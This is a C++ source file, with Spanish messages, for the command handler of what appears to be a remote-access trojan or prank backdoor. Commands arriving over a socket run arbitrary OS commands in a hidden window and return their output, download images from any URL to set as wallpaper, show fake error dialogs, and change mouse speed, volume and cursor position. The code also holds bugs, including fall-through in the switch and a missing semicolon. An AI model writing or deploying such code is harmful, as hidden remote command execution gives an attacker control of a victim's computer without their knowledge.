#include "Commands.hpp"
#include "Utils.cpp"
#include <curl/curl.h>
#include <string>

CommandType Commands::getCommandType(const string &command) {
  if (command == "mouse")
    return MOUSE;
  else if (command == "wallpaper")
    return WALLPAPER;
  else if (command == "os")
    return OS;
  else if (command == "dialog")
    return DIALOG;
  else if (command == "volume")
    return VOLUME;
  else if (command == "mousemove")
    return MOUSE_MOVE;
  return UNKNOWN;
}

void Commands::processCommand(const char *command, const char *params) {
  CommandType cmdType = this->getCommandType(command);
  this->acceptCommand(cmdType, params);
}

void Commands::acceptCommand(CommandType command, const string &params) {
  bool result = false;
  switch (command) {
  case MOUSE:
    result = mouseCommand(params);
    break;
  case WALLPAPER:
    result = wallpaperCommand(params);
    break;
  case OS:
    result = osCommand(params);
    break;
  case DIALOG:
    result = dialogCommand(params);
    break;
  case VOLUME:
    result = volumeCommand(params);
  case MOUSE_MOVE:
    result = mouseMoveCommand(params);
  default:
    string response = "Comando desconocido";
    send(clientSocket, response.c_str(), response.length(), 0);
    return;
  }

  if (!result)
    return;
  string response = "Success";
  send(clientSocket, response.c_str(), response.length(), 0);
}

bool Commands::mouseCommand(const string &params) {
  try {
    int sensitivity = stoi(params);
    if (sensitivity < 1 || sensitivity > 20) {
      string response = "La sensibilidad debe estar entre 1 y 20";
      send(clientSocket, response.c_str(), response.length(), 0);
      return false;
    }

#ifdef _WIN32
    SystemParametersInfo(SPI_SETMOUSESPEED, 0, (PVOID)sensitivity,
                         SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
#endif
  } catch (const invalid_argument &e) {
    string response = "Parametro invalido";
    send(clientSocket, response.c_str(), response.length(), 0);
    return false;
  }
  return true;
}

bool Commands::downloadImage(const string &url, const string &filePath) {
  CURL *curl;
  CURLcode res;
  ofstream outFile(filePath, ios::binary);

  if (!outFile.is_open()) {
    return false;
  }

  curl = curl_easy_init();
  if (curl) {
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outFile);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    outFile.close();

    if (res != CURLE_OK) {
      return false;
    }
  }
  return true;
}

bool Commands::wallpaperCommand(const string &params) {
  cout << params << endl;
  const string filePath = "./image.jpg";
  const bool downloaded = downloadImage(params, filePath);
  if (!downloaded) {
    string response = "Error en descargar imagen";
    send(clientSocket, response.c_str(), response.length(), 0);
    return false;
  }

#ifdef _WIN32
  setWallpaper(&filePath)
#endif

      return true;
}

bool Commands::osCommand(const string &params) {
#ifdef _WIN32
  string result;
  HANDLE hStdOutRead, hStdOutWrite;
  SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

  if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
    return false;
  }

  STARTUPINFO si = {sizeof(STARTUPINFO)};
  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
  si.hStdOutput = hStdOutWrite;
  si.hStdError = hStdOutWrite;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi = {};

  if (!CreateProcess(NULL, (LPSTR)params.c_str(), NULL, NULL, TRUE, 0, NULL,
                     NULL, &si, &pi)) {
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdOutRead);
    return false;
  }

  CloseHandle(hStdOutWrite);

  char buffer[128];
  DWORD bytesRead;
  while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) &&
         bytesRead > 0) {
    buffer[bytesRead] = '\0';
    result += buffer;
  }

  CloseHandle(hStdOutRead);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  send(clientSocket, result.c_str(), result.length(), 0);
#endif
  // return system(params.c_str());
  return true;
}

bool Commands::dialogCommand(const string &params) {
#ifdef _WIN32
  return MessageBoxA(NULL, params.c_str(), "Error", MB_OK | MB_ICONERROR);
#endif

  return true;
}

bool Commands::volumeCommand(const string &params) {
  try {
    int value = stoi(params);
    if (value < 0 || value > 100) {
      string response = "La sensibilidad debe estar entre el 0 y 100";
      send(clientSocket, response.c_str(), response.length(), 0);
      return false;
    }

#ifdef _WIN32
    float volume = static_cast<float>(value) / 100;
    CoInitialize(NULL);
    IMMDeviceEnumerator *deviceEnumerator = NULL;
    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
                     __uuidof(IMMDeviceEnumerator), (void **)&deviceEnumerator);

    IMMDevice *defaultDevice = NULL;
    deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole,
                                              &defaultDevice);

    IAudioEndpointVolume *endpointVolume = NULL;
    defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL,
                            (void **)&endpointVolume);

    endpointVolume->SetMasterVolumeLevelScalar(volume, NULL);

    endpointVolume->Release();
    defaultDevice->Release();
    deviceEnumerator->Release();
    CoUninitialize();
#endif
  } catch (const invalid_argument &e) {
    string response = "Parametro invalido";
    send(clientSocket, response.c_str(), response.length(), 0);
    return false;
  }
  return true;
}

bool Commands::mouseMoveCommand(const string &params) {
  try {
    int value = stoi(params);
    if (value < 0 || value > 10) {
      string response = "La sensibilidad debe estar entre el 0 y 10";
      send(clientSocket, response.c_str(), response.length(), 0);
      return false;
    }

#ifdef _WIN32
    POINT cursorPos;
    srand(static_cast<unsigned int>(time(nullptr)));

    DWORD endTime = GetTickCount() + (value * 1000);

    while (GetTickCount() < endTime) {
      if (GetCursorPos(&cursorPos)) {
        int randomX = cursorPos.x + (rand() % 21 - 10);
        int randomY = cursorPos.y + (rand() % 21 - 10);

        SetCursorPos(randomX, randomY);
        Sleep(100);
      }
    }
#endif
  } catch (const invalid_argument &e) {
    string response = "Parametro invalido";
    send(clientSocket, response.c_str(), response.length(), 0);
    return false;
  }
  return true;
}
